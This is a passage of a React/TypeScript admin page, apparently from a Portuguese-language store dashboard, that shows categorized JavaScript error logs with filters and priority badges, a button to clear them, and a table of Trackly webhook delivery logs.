                                    <span className="text-muted-foreground truncate max-w-[300px] font-mono text-[10px]">{entry.detail}</span>
                                    <span className="text-muted-foreground text-[10px] ml-auto flex-shrink-0">
                                      {new Date(entry.ts).toLocaleTimeString("pt-BR")}
                                    </span>
                                  </div>
                                );
                              })}
                            </div>
                          </details>
                        )}
                      </div>

                      {/* Category Filter Cards */}
                      <div>
                        <h2 className="text-lg font-bold mb-3 flex items-center gap-2">
                          <Bug className="h-5 w-5" /> Logs Inteligentes
                        </h2>
                        <div className="grid grid-cols-2 sm:grid-cols-5 gap-3 mb-4">
                          {(["system", "integration", "external", "bot", "unknown"] as LogCategory[]).map(cat => {
                            const cfg = CATEGORY_CONFIG[cat];
                            const active = logFilter.has(cat);
                            return (
                              <button
                                key={cat}
                                onClick={() => toggleFilter(cat)}
                                className={`bg-card border rounded-xl p-3 text-left transition-all ${active ? `ring-2 ring-primary/50 ${cfg.borderColor}` : "opacity-60 hover:opacity-80"}`}
                              >
                                <div className="flex items-center gap-2 mb-1">
                                  <div className={`h-6 w-6 rounded flex items-center justify-center ${cfg.bgColor} ${cfg.color}`}>
                                    {cfg.icon}
                                  </div>
                                  <span className="text-lg font-bold">{counts[cat]}</span>
                                </div>
                                <p className="text-[10px] font-medium text-muted-foreground uppercase tracking-wide">{cfg.label}</p>
                              </button>
                            );
                          })}
                        </div>
                      </div>

                      {/* Filter indicator */}
                      <div className="flex items-center gap-2 flex-wrap">
                        <Filter className="h-4 w-4 text-muted-foreground" />
                        <span className="text-xs text-muted-foreground">Filtros ativos:</span>
                        {Array.from(logFilter).map(cat => (
                          <span key={cat} className={`text-[10px] font-bold px-2 py-0.5 rounded-full ${CATEGORY_CONFIG[cat as LogCategory].bgColor} ${CATEGORY_CONFIG[cat as LogCategory].color}`}>
                            {CATEGORY_CONFIG[cat as LogCategory].label}
                          </span>
                        ))}
                        {logFilter.size === 0 && <span className="text-xs text-muted-foreground italic">Nenhum — clique nos cards acima</span>}
                      </div>

                      {/* JS Errors - Classified */}
                      <div>
                        <div className="flex items-center justify-between mb-3">
                          <h3 className="text-sm font-bold">
                            Erros JavaScript ({filtered.reduce((s, g) => s + g.count, 0)} ocorrências em {filtered.length} grupos)
                          </h3>
                          {errorLogs.length > 0 && (
                            <button
                              onClick={() => {
                                supabase.from("user_events").delete().eq("event_type", "js_error").then(() => {
                                  setErrorLogs([]);
                                });
                              }}
                              className="text-xs text-destructive hover:underline"
                            >
                              Limpar todos
                            </button>
                          )}
                        </div>

                        {filtered.length === 0 ? (
                          <div className="bg-emerald-500/5 border border-emerald-500/30 rounded-xl p-4 flex items-center gap-3">
                            <CheckCircle2 className="h-5 w-5 text-emerald-500" />
                            <span className="text-sm text-emerald-600 font-medium">
                              {errorLogs.length === 0 ? "Nenhum erro JavaScript registrado" : "Nenhum erro nos filtros selecionados"}
                            </span>
                          </div>
                        ) : (
                          <div className="space-y-2">
                            {filtered.map((g, idx) => {
                              const cfg = CATEGORY_CONFIG[g.log.category];
                              const wasAutocorrected = g.log.raw?.event_data?.autocorrected;
                              return (
                                <div key={idx} className={`border rounded-xl p-4 ${cfg.bgColor} ${cfg.borderColor}`}>
                                  <div className="flex items-start justify-between gap-2">
                                    <div className="flex items-center gap-2 flex-1 min-w-0">
                                      <div className={`h-6 w-6 rounded flex items-center justify-center flex-shrink-0 ${cfg.bgColor} ${cfg.color}`}>
                                        {cfg.icon}
                                      </div>
                                      <div className="min-w-0 flex-1">
                                        <div className="flex items-center gap-2 flex-wrap">
                                          <span className={`text-[10px] font-bold px-1.5 py-0.5 rounded ${cfg.bgColor} ${cfg.color} uppercase`}>
                                            {cfg.label}
                                          </span>
                                          <span className={`text-[10px] font-bold px-1.5 py-0.5 rounded ${g.log.priority === "high" ? "bg-destructive/20 text-destructive" : g.log.priority === "medium" ? "bg-amber-500/20 text-amber-600" : "bg-muted text-muted-foreground"}`}>
                                            {g.log.priority === "high" ? "ALTA" : g.log.priority === "medium" ? "MÉDIA" : "BAIXA"}
                                          </span>
                                          {wasAutocorrected && (
                                            <span className="text-[10px] font-bold px-1.5 py-0.5 rounded bg-emerald-500/20 text-emerald-600 flex items-center gap-1">
                                              <RotateCcw className="h-2.5 w-2.5" /> AUTOCORRIGIDO
                                            </span>
                                          )}
                                          {g.count > 1 && (
                                            <span className="text-[10px] font-bold px-1.5 py-0.5 rounded bg-secondary text-secondary-foreground">
                                              {g.count}x ocorrências
                                            </span>
                                          )}
                                        </div>
                                        <p className="text-sm font-semibold text-foreground break-all mt-1">{g.log.message}</p>
                                      </div>
                                    </div>
                                    <span className="text-[10px] text-muted-foreground whitespace-nowrap flex-shrink-0">
                                      {new Date(g.log.created_at).toLocaleString("pt-BR")}
                                    </span>
                                  </div>
                                  {g.log.source && (
                                    <p className="text-xs text-muted-foreground mt-1.5 font-mono break-all pl-8">
                                      {g.log.source}{g.log.line ? `:${g.log.line}` : ""}
                                    </p>
                                  )}
                                </div>
                              );
                            })}
                          </div>
                        )}
                      </div>

                      {/* Webhook Logs */}
                      <div>
                        <h2 className="text-lg font-bold mb-3 flex items-center gap-2">
                          <Webhook className="h-5 w-5" /> Webhook Trackly ({webhookLogs.length})
                        </h2>
                        {webhookLogs.length === 0 ? (
                          <div className="bg-muted border rounded-xl p-4 flex items-center gap-3">
                            <span className="text-sm text-muted-foreground">Nenhum log de webhook registrado</span>
                          </div>
                        ) : (
                          <div className="overflow-x-auto border rounded-xl">
                            <table className="w-full text-xs">
                              <thead className="bg-muted">
                                <tr>
                                  {["Data", "Pedido", "Status", "HTTP", "URL", "Resposta"].map((h) => (
                                    <th key={h} className="px-3 py-2 text-left whitespace-nowrap font-semibold">{h}</th>
                                  ))}
                                </tr>
                              </thead>
                              <tbody>
                                {webhookLogs.map((log: any) => (
                                  <tr key={log.id} className="border-t hover:bg-muted/50">
                                    <td className="px-3 py-2 whitespace-nowrap">{new Date(log.created_at).toLocaleString("pt-BR")}</td>
                                    <td className="px-3 py-2 whitespace-nowrap font-mono text-[10px]">{log.order_id?.slice(0, 8) || "—"}</td>
                                    <td className="px-3 py-2">
                                      <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${log.status === "sent" ? "bg-success/20 text-success" : "bg-destructive/20 text-destructive"}`}>
                                        {log.status}
                                      </span>
                                    </td>
                                    <td className="px-3 py-2">{log.http_status || "—"}</td>
                                    <td className="px-3 py-2 max-w-[200px] truncate font-mono text-[10px]">{log.webhook_url}</td>
                                    <td className="px-3 py-2 max-w-[200px] truncate font-mono text-[10px]">{log.response || "—"}</td>
                                  </tr>
                                ))}
                              </tbody>
                            </table>
                          </div>
                        )}
                      </div>
                    </>
                  );
                })()}
              </>
            )}
          </div>
        )}
        </div>
      </main>
    </div>
  );
}

export default function Admin() {
  return (
    <ProtectedRoute>
      <AdminContent />
    </ProtectedRoute>
  );
}
